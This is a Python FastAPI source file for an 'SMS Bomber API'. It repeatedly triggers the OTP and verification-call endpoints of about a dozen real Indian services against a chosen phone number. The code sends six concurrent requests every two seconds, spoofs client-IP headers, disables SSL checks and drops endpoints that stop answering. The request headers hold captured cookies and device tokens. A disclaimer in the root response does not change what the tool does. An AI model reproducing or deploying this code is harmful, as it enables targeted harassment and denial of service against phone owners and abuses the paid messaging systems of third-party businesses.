import asyncio
import json
import aiohttp
import sys
import urllib.parse
import time
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import uvicorn
from typing import Dict, Any, List
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(
    title="SMS Bomber API",
    description="High-speed SMS bombing API with 2x speed",
    version="2.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global state management
bomber_tasks: Dict[str, asyncio.Task] = {}
bomber_states: Dict[str, Dict[str, Any]] = {}

# Enhanced API endpoints with more targets
APIS = [
    {
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "payload": {
            "mobileNo": None,
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "payload": {"mobile_number": None},
        "headers": {
            "Mobilenumber": None,
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        }
    },
    {
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": None, "resend_otp": "resend_otp"},
        "headers": {
            "Host": "ekyc.daycoindia.com",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
            "Priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "payload": {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "",
            "phone_number": None,
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        "headers": {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.2"
        }
    },
    {
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "payload": {"phone": None, "countryCode": "IN"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
            "origin": "https://www.nobroker.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "payload": {"mobileNumber": None},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer null",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://app.shiprocket.in",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.shiprocket.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "payload": {"phone": None, "applSource": "", "isOtpViaCallAtLogin": "true"},
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": None},
        "headers": {
            "Host": "api.penpencil.co",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "payload": {"number": None, "is_corporate_user": False, "otp_on_call": True},
        "headers": {
            "Host": "www.1mg.com",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "payload": {"mobile": None},
        "headers": {
            "Host": "profile.swiggy.com",
            "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
            "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
            "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
            "pl-version": "55",
            "user-agent": "Swiggy-Android",
            "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
            "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
            "version-code": "1161",
            "app-version": "4.38.1",
            "latitude": "0.0",
            "longitude": "0.0",
            "os-version": "13",
            "accessibility_enabled": "false",
            "swuid": "4c27ae3a76b146f3",
            "deviceid": "4c27ae3a76b146f3",
            "x-network-quality": "GOOD",
            "accept-encoding": "gzip",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8",
            "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO"
        }
    },
    {
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "payload": {"phone_number": {"number": None, "country_code": "+91"}},
        "headers": {
            "Host": "api.kpnfresh.com",
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "payload": {"mobile_number": None},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
    }
]

async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any], phone_number: str, ip_address: str) -> tuple:
    """Send a single request to an API endpoint"""
    try:
        # Replace phone number in payload and headers
        modified_payload = json.loads(json.dumps(api["payload"]))
        if isinstance(modified_payload, dict):
            for key, value in modified_payload.items():
                if isinstance(value, str) and str(phone_number) in value:
                    modified_payload[key] = value.replace(str(phone_number), str(phone_number))
                elif str(value) == str(phone_number):
                    modified_payload[key] = phone_number
        
        # Replace phone number in headers
        modified_headers = api["headers"].copy()
        for key, value in modified_headers.items():
            if isinstance(value, str) and str(phone_number) in value:
                modified_headers[key] = value.replace(str(phone_number), str(phone_number))
            elif str(value) == str(phone_number):
                modified_headers[key] = phone_number
        
        # Add IP spoofing headers
        modified_headers["X-Forwarded-For"] = ip_address
        modified_headers["Client-IP"] = ip_address

        if api["method"] == "POST":
            if modified_headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in modified_payload.items())
                modified_headers["Content-Length"] = str(len(payload_str.encode('utf-8')))
                response = await session.post(
                    api["endpoint"], 
                    data=payload_str, 
                    headers=modified_headers, 
                    timeout=aiohttp.ClientTimeout(total=1),
                    ssl=False
                )
            else:
                response = await session.post(
                    api["endpoint"], 
                    json=modified_payload, 
                    headers=modified_headers, 
                    timeout=aiohttp.ClientTimeout(total=1),
                    ssl=False
                )
        else:
            logger.warning(f"Unsupported method: {api['method']}")
            return None, api

        status_code = response.status
        return status_code, api

    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.debug(f"Request failed for {api['endpoint']}: {e}")
        return None, api

async def bomber_worker(phone_number: str, ip_address: str, task_id: str):
    """Main bomber worker coroutine"""
    logger.info(f"Starting bomber for {phone_number} (Task ID: {task_id})")
    
    session_timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=session_timeout) as session:
        cycle_count = 0
        successful_apis = APIS.copy()
        
        while task_id in bomber_states and bomber_states[task_id].get("running", False):
            try:
                # Create 6 concurrent requests (2x speed)
                tasks = []
                for _ in range(6):
                    if successful_apis:
                        # Randomize API selection for better distribution
                        import random
                        selected_api = random.choice(successful_apis)
                        tasks.append(send_request(session, selected_api, phone_number, ip_address))
                
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Filter successful APIs
                    new_apis = []
                    for result in results:
                        if isinstance(result, Exception):
                            continue
                        status_code, api = result
                        if status_code in [200, 201]:
                            new_apis.append(api)
                        elif status_code is not None:
                            logger.debug(f"Removing {api['endpoint']} due to status code {status_code}")
                    
                    # Update successful APIs list
                    if new_apis:
                        successful_apis = new_apis
                    elif cycle_count > 10:  # Only stop if we've tried multiple cycles
                        logger.warning(f"All APIs failed for {phone_number}, stopping")
                        break
                
                cycle_count += 1
                
                # 2-second delay for 2x speed (6 calls per 2 seconds)
                await asyncio.sleep(2)
                
            except asyncio.CancelledError:
                logger.info(f"Bomber cancelled for {phone_number}")
                break
            except Exception as e:
                logger.error(f"Error in bomber worker for {phone_number}: {e}")
                await asyncio.sleep(1)

    logger.info(f"Bomber stopped for {phone_number}")
    if task_id in bomber_states:
        bomber_states[task_id]["running"] = False

@app.get("/api/start")
async def start_bomber(phone: str):
    """Start SMS bombing for a phone number"""
    if not phone.isdigit() or len(phone) != 10:
        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
    
    # Generate task ID
    import uuid
    task_id = str(uuid.uuid4())
    
    # Check if already running
    if phone in bomber_states and bomber_states[phone].get("running", False):
        return JSONResponse(
            status_code=200,
            content={
                "status": "already_running",
                "message": f"Bomber already running for {phone}",
                "phone": phone,
                "task_id": bomber_states[phone]["task_id"]
            }
        )
    
    # Create new bomber state
    bomber_states[phone] = {
        "task_id": task_id,
        "running": True,
        "start_time": time.time(),
        "phone": phone
    }
    
    # Start bomber task
    bomber_tasks[task_id] = asyncio.create_task(bomber_worker(phone, "192.168.1.1", task_id))
    
    logger.info(f"Started bomber for {phone} with Task ID: {task_id}")
    
    return JSONResponse(
        status_code=200,
        content={
            "status": "started",
            "message": f"SMS bombing started for {phone}",
            "phone": phone,
            "task_id": task_id,
            "speed": "6 calls per 2 seconds (2x speed)",
            "api_count": len(APIS)
        }
    )

@app.get("/api/stop")
async def stop_bomber(phone: str):
    """Stop SMS bombing for a phone number"""
    if not phone.isdigit() or len(phone) != 10:
        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
    
    if phone not in bomber_states:
        return JSONResponse(
            status_code=200,
            content={
                "status": "not_running",
                "message": f"No bomber running for {phone}",
                "phone": phone
            }
        )
    
    if not bomber_states[phone].get("running", False):
        return JSONResponse(
            status_code=200,
            content={
                "status": "already_stopped",
                "message": f"Bomber already stopped for {phone}",
                "phone": phone
            }
        )
    
    # Cancel the task
    task_id = bomber_states[phone]["task_id"]
    if task_id in bomber_tasks:
        bomber_tasks[task_id].cancel()
        try:
            await bomber_tasks[task_id]
        except asyncio.CancelledError:
            pass
        del bomber_tasks[task_id]
    
    # Update state
    bomber_states[phone]["running"] = False
    bomber_states[phone]["end_time"] = time.time()
    
    logger.info(f"Stopped bomber for {phone}")
    
    return JSONResponse(
        status_code=200,
        content={
            "status": "stopped",
            "message": f"SMS bombing stopped for {phone}",
            "phone": phone,
            "task_id": task_id,
            "duration": f"{bomber_states[phone].get('end_time', 0) - bomber_states[phone]['start_time']:.2f} seconds"
        }
    )

@app.get("/api/status")
async def get_status(phone: str = None):
    """Get status of all running bombers or specific phone number"""
    if phone:
        if not phone.isdigit() or len(phone) != 10:
            raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
        
        if phone not in bomber_states:
            return JSONResponse(
                status_code=200,
                content={
                    "phone": phone,
                    "status": "not_found",
                    "running": False
                }
            )
        
        state = bomber_states[phone]
        return JSONResponse(
            status_code=200,
            content={
                "phone": phone,
                "status": "running" if state.get("running", False) else "stopped",
                "running": state.get("running", False),
                "task_id": state.get("task_id"),
                "start_time": state.get("start_time"),
                "duration": f"{time.time() - state['start_time']:.2f} seconds" if state.get("running") else None
            }
        )
    
    # Return all statuses
    all_statuses = []
    current_time = time.time()
    
    for phone, state in bomber_states.items():
        all_statuses.append({
            "phone": phone,
            "status": "running" if state.get("running", False) else "stopped",
            "running": state.get("running", False),
            "task_id": state.get("task_id"),
            "start_time": state.get("start_time"),
            "duration": f"{current_time - state['start_time']:.2f} seconds" if state.get("running") else None
        })
    
    return JSONResponse(
        status_code=200,
        content={
            "total_bombers": len([s for s in all_statuses if s["running"]]),
            "active_bombers": [s for s in all_statuses if s["running"]],
            "all_bombers": all_statuses
        }
    )

@app.get("/api/stats")
async def get_stats():
    """Get API statistics"""
    return JSONResponse(
        status_code=200,
        content={
            "total_apis": len(APIS),
            "active_bombers": len([s for s in bomber_states.values() if s.get("running", False)]),
            "total_sessions": len(bomber_states),
            "api_endpoints": [api["endpoint"] for api in APIS]
        }
    )

@app.get("/")
async def root():
    """API root endpoint"""
    return JSONResponse(
        status_code=200,
        content={
            "message": "SMS Bomber API v2.0",
            "version": "2.0",
            "endpoints": {
                "start": "/api/start?phone=NUMBER",
                "stop": "/api/stop?phone=NUMBER", 
                "status": "/api/status?phone=NUMBER",
                "stats": "/api/stats"
            },
            "speed": "6 calls per 2 seconds (2x speed)",
            "note": "Use responsibly. Developer not responsible for misuse."
        }
    )

# Vercel handler
def handler(request):
    """Vercel serverless function handler"""
    from mangum import Mangum
    mangum_handler = Mangum(app)
    return mangum_handler(request)

if __name__ == "__main__":
    # Local development
    uvicorn.run(
        "app:app",
        host="0.0.0.0",
        port=8000,
        reload=True
    )
